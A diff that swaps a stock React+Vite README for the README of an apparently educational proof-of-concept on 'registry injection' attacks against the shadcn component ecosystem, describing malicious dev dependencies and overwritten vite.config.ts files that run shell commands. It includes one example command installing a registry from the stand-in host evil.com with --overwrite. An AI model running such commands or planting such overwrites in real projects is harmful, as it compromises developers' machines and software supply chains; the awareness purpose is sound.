@@ -1,69 +1,34 @@
-# React + TypeScript + Vite
+# shadcn-registry-injection-demo
 
-This template provides a minimal setup to get React working in Vite with HMR and some ESLint rules.
+> **Proof of Concept:** Registry Injection Attack targeting the `shadcn` component ecosystem  
+> **Educational Purpose Only**
 
-Currently, two official plugins are available:
+---
 
-- [@vitejs/plugin-react](https://github.com/vitejs/vite-plugin-react/blob/main/packages/plugin-react) uses [Babel](https://babeljs.io/) for Fast Refresh
-- [@vitejs/plugin-react-swc](https://github.com/vitejs/vite-plugin-react/blob/main/packages/plugin-react-swc) uses [SWC](https://swc.rs/) for Fast Refresh
+## ⚠️ Disclaimer
 
-## Expanding the ESLint configuration
+This repository is created solely for educational and awareness purposes to demonstrate how a registry injection attack could compromise projects by injecting malicious code through dependencies and configuration files.  
+**Do NOT use this code for any unauthorized, harmful, or illegal activities.**
 
-If you are developing a production application, we recommend updating the configuration to enable type-aware lint rules:
+---
 
-```js
-export default tseslint.config([
-  globalIgnores(['dist']),
-  {
-    files: ['**/*.{ts,tsx}'],
-    extends: [
-      // Other configs...
+## What is a Registry Injection Attack?
 
-      // Remove tseslint.configs.recommended and replace with this
-      ...tseslint.configs.recommendedTypeChecked,
-      // Alternatively, use this for stricter rules
-      ...tseslint.configs.strictTypeChecked,
-      // Optionally, add this for stylistic rules
-      ...tseslint.configs.stylisticTypeChecked,
+A Registry Injection Attack involves publishing or injecting malicious packages into public or private package registries to trick developers into installing compromised dependencies or components. Attackers exploit trust in package names, registries, or installation commands to gain unauthorized access, steal data, or execute malicious code silently.
 
-      // Other configs...
-    ],
-    languageOptions: {
-      parserOptions: {
-        project: ['./tsconfig.node.json', './tsconfig.app.json'],
-        tsconfigRootDir: import.meta.dirname,
-      },
-      // other options...
-    },
-  },
-])
-```
+---
 
-You can also install [eslint-plugin-react-x](https://github.com/Rel1cx/eslint-react/tree/main/packages/plugins/eslint-plugin-react-x) and [eslint-plugin-react-dom](https://github.com/Rel1cx/eslint-react/tree/main/packages/plugins/eslint-plugin-react-dom) for React-specific lint rules:
+## About This Demo and the shadcn Vulnerability
 
-```js
-// eslint.config.js
-import reactX from 'eslint-plugin-react-x'
-import reactDom from 'eslint-plugin-react-dom'
+Shadcn registries let you install UI components quickly, but they can also include **dev dependencies**, **overwrite configuration files**, and **silently inject malicious code** into your project.
 
-export default tseslint.config([
-  globalIgnores(['dist']),
-  {
-    files: ['**/*.{ts,tsx}'],
-    extends: [
-      // Other configs...
-      // Enable lint rules for React
-      reactX.configs['recommended-typescript'],
-      // Enable lint rules for React DOM
-      reactDom.configs.recommended,
-    ],
-    languageOptions: {
-      parserOptions: {
-        project: ['./tsconfig.node.json', './tsconfig.app.json'],
-        tsconfigRootDir: import.meta.dirname,
-      },
-      // other options...
-    },
-  },
-])
-```
+### How the Attack Works
+
+- A `registry.json` file defines components, dependencies, and even files to overwrite.
+- The attacker includes a malicious dev dependency, such as `vite-plugin-run`, which can execute arbitrary shell commands when your development server starts.
+- The attacker overwrites critical config files like `vite.config.ts` to inject code that runs commands automatically — without any warning or prompt.
+- For example, an attacker can run:
+
+  ```bash
+  npx shadcn@latest add https://evil.com/registry.json --overwrite
+  ```
